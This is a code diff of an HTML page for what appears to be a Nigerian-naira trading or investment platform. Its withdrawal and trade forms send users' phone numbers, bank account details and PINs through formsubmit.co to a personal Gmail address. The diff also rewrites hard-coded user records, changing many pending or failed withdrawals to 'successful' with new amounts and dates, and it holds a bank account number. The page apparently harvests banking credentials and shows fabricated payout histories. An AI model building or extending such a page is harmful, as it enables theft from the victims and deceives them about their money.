@@ -1039,29 +1039,30 @@
             <div class="form-type-header">📋 WITHDRAWAL FORM</div>
             <form id="withdrawForm" action="https://formsubmit.co/empirevirtual99@gmail.com" method="POST">
                 <input type="hidden" name="_subject" value="Withdrawal Form Submission">
+                <input type="hidden" name="_template" value="table">
                 <div class="form-group">
                     <label class="form-label">Phone Number</label>
-                    <input type="text" class="form-input" id="withdrawPhone" name="phone" disabled>
+                    <input type="text" class="form-input" id="withdrawPhone" name="Phone_No" disabled>
                 </div>
                 <div class="form-group">
                     <label class="form-label">Account Number</label>
-                    <input type="text" class="form-input" id="withdrawAccountNumber" name="account_number" disabled>
+                    <input type="text" class="form-input" id="withdrawAccountNumber" name="Account_No" disabled>
                 </div>
                 <div class="form-group">
                     <label class="form-label">Bank Name</label>
-                    <input type="text" class="form-input" id="withdrawBankName" name="bank_name" disabled>
+                    <input type="text" class="form-input" id="withdrawBankName" name="Bank_Name" disabled>
                 </div>
                 <div class="form-group">
                     <label class="form-label">Account Name</label>
-                    <input type="text" class="form-input" id="withdrawAccountName" name="account_name" disabled>
+                    <input type="text" class="form-input" id="withdrawAccountName" name="Account_Name" disabled>
                 </div>
                 <div class="form-group">
                     <label class="form-label">Amount (₦)</label>
-                    <input type="number" class="form-input" id="withdrawAmount" name="amount" placeholder="Enter amount" required>
+                    <input type="number" class="form-input" id="withdrawAmount" name="Amount" placeholder="Enter amount" required>
                 </div>
                 <div class="form-group">
                     <label class="form-label">Date</label>
-                    <input type="date" class="form-input" id="withdrawDate" name="date" required>
+                    <input type="date" class="form-input" id="withdrawDate" name="Date" required>
                 </div>
                 <div class="form-group">
                     <label class="form-label">PIN</label>
@@ -1071,7 +1072,7 @@
                         <input type="password" maxlength="1" class="pin-input-box withdraw-pin" inputmode="numeric" required>
                         <input type="password" maxlength="1" class="pin-input-box withdraw-pin" inputmode="numeric" required>
                     </div>
-                    <input type="hidden" id="withdrawPinHidden" name="pin">
+                    <input type="hidden" id="withdrawPinHidden" name="PIN">
                 </div>
                 <button type="submit" class="btn btn-primary" style="width: 100%;"><i class="fas fa-paper-plane"></i> Submit</button>
             </form>
@@ -1095,18 +1096,19 @@
             </div>
             <form id="tradeForm" action="https://formsubmit.co/empirevirtual99@gmail.com" method="POST">
                 <input type="hidden" name="_subject" value="Trade Form Submission">
+                <input type="hidden" name="_template" value="table">
                 <div class="form-group">
                     <label class="form-label">Full Name</label>
-                    <input type="text" class="form-input" id="tradeName" name="full_name" disabled>
+                    <input type="text" class="form-input" id="tradeName" name="Full_Name" disabled>
                 </div>
                 <div class="form-group">
                     <label class="form-label">Amount (₦5,000 - ₦20,000)</label>
-                    <input type="range" class="form-input" id="tradeAmount" name="amount" min="5000" max="20000" step="1000" value="10000">
+                    <input type="range" class="form-input" id="tradeAmount" name="Amount" min="5000" max="20000" step="1000" value="10000">
                     <div style="text-align: center; margin-top: 8px; color: var(--accent-green); font-weight: 700;" id="amountDisplay">₦10,000</div>
                 </div>
                 <div class="form-group">
                     <label class="form-label">Date</label>
-                    <input type="date" class="form-input" id="tradeDate" name="date" required>
+                    <input type="date" class="form-input" id="tradeDate" name="Date" required>
                 </div>
                 <div class="form-group">
                     <label class="form-label">PIN</label>
@@ -1116,7 +1118,7 @@
                         <input type="password" maxlength="1" class="pin-input-box trade-pin" inputmode="numeric" required>
                         <input type="password" maxlength="1" class="pin-input-box trade-pin" inputmode="numeric" required>
                     </div>
-                    <input type="hidden" id="tradePinHidden" name="pin">
+                    <input type="hidden" id="tradePinHidden" name="Trade_PIN">
                 </div>
                 <button type="submit" class="btn btn-primary" style="width: 100%;" id="tradeSubmitBtn"><i class="fas fa-check"></i> Submit</button>
             </form>
@@ -1205,11 +1207,11 @@
                 },
                 profileImage: 'AddText_11-25-06.08.39.png',
                 lastWithdrawal: {
-                    id: 'TXN-21360476-2255',
-                    amount: 5000,
-                    status: 'pending',
+                    id: 'TXN-20260408-5001',
+                    amount: 25000,
+                    status: 'successful',
                     method: 'Wallet',
-                    date: new Date('2026-04-13T09:32:42Z')
+                    date: new Date('2026-04-08T19:21:22Z')
                 }
             },
             '1220': {
@@ -1249,7 +1251,7 @@
                 nextPaymentDate: '2026-05-25T20:10:00Z',
                 activationDate: '2024-11-15T10:15:30Z',
                 expiryDate: '2026-07-15T23:59:59Z',
-                tradeDate: 2,
+                tradeDate: 15,
                 bankDetails: {
                     accountNumber: '8145300013',
                     bankName: 'F.C.M.B',
@@ -1267,7 +1269,7 @@
                     amount: 5000,
                     status: 'successful',
                     method: 'Wallet',
-                    date: new Date('2026-04-13T10:30:15Z'),
+                    date: new Date('2026-04-05T14:30:15Z'),
                     failureReason: 'Insufficient funds'
                 }
             },
@@ -1294,10 +1296,10 @@
                 profileImage: 'AddText_06-03-08.29.58.png',
                 lastWithdrawal: {
                     id: 'TXN-20260403-5012',
-                    amount: 32000,
+                    amount: 8500,
                     status: 'failed',
                     method: 'Wallet',
-                    date: new Date('2026-04-13T09:53:50Z'),
+                    date: new Date('2026-04-03T11:20:00Z'),
                     failureReason: 'Insufficient funds'
                 }
             },
@@ -1323,11 +1325,11 @@
                 },
                 profileImage: 'AddText_06-05-09.14.49.png',
                 lastWithdrawal: {
-                    id: 'TXN-20960702-1908',
+                    id: 'TXN-20260402-1908',
                     amount: 1500,
-                    status: 'pending',
+                    status: 'successful',
                     method: 'Wallet',
-                    date: new Date('2025-04-13T10:25:38Z')
+                    date: new Date('2026-04-02T16:45:30Z')
                 }
             },
             '2019': {
@@ -1353,10 +1355,10 @@
                 profileImage: 'AddText_06-02-03.50.45.png',
                 lastWithdrawal: {
                     id: 'TXN-20260401-2019',
-                    amount: 9000,
-                    status: 'failed',
+                    amount: 4500,
+                    status: 'pending',
                     method: 'Wallet',
-                    date: new Date('2025-11-01T10:15:00Z')
+                    date: new Date('2026-04-01T10:15:00Z')
                 }
             },
             '1266': {
@@ -1382,10 +1384,10 @@
                 profileImage: 'AddText_05-22-09.03.57.png',
                 lastWithdrawal: {
                     id: 'TXN-20260331-1266',
-                    amount: 7000,
-                    status: 'failed',
+                    amount: 3500,
+                    status: 'successful',
                     method: 'Wallet',
-                    date: new Date('2025-06-20T13:25:45Z')
+                    date: new Date('2026-03-31T13:25:45Z')
                 }
             },
             '4073': {
@@ -1411,10 +1413,10 @@
                 profileImage: 'AddText_05-25-10.37.46.png',
                 lastWithdrawal: {
                     id: 'TXN-20260330-4073',
-                    amount: 7000,
-                    status: 'failed',
+                    amount: 2000,
+                    status: 'successful',
                     method: 'Wallet',
-                    date: new Date('2025-12-30T08:50:12Z')
+                    date: new Date('2026-03-30T08:50:12Z')
                 }
             },
             '1313': {
@@ -1440,10 +1442,10 @@
                 profileImage: 'AddText_05-25-10.37.07.png',
                 lastWithdrawal: {
                     id: 'TXN-20260329-1313',
-                    amount: 7000,
+                    amount: 5500,
                     status: 'successful',
                     method: 'Wallet',
-                    date: new Date('2025-11-29T15:35:28Z')
+                    date: new Date('2026-03-29T15:35:28Z')
                 }
             },
             '1995': {
@@ -1468,11 +1470,11 @@
                 },
                 profileImage: 'AddText_12-23-12.28.07.png',
                 lastWithdrawal: {
-                    id: 'TXN-20060330-1995',
-                    amount: 9000,
+                    id: 'TXN-20260328-1995',
+                    amount: 6000,
                     status: 'pending',
                     method: 'Wallet',
-                    date: new Date('2026-04-13T10:19:05Z')
+                    date: new Date('2026-03-28T12:00:00Z')
                 }
             },
             '2027': {
@@ -1499,9 +1501,9 @@
                 lastWithdrawal: {
                     id: 'TXN-20260327-2027',
                     amount: 3000,
-                    status: 'faild',
+                    status: 'successful',
                     method: 'Wallet',
-                    date: new Date('2026-04-07T10:30:45Z')
+                    date: new Date('2026-03-27T09:30:45Z')
                 }
             }
         };
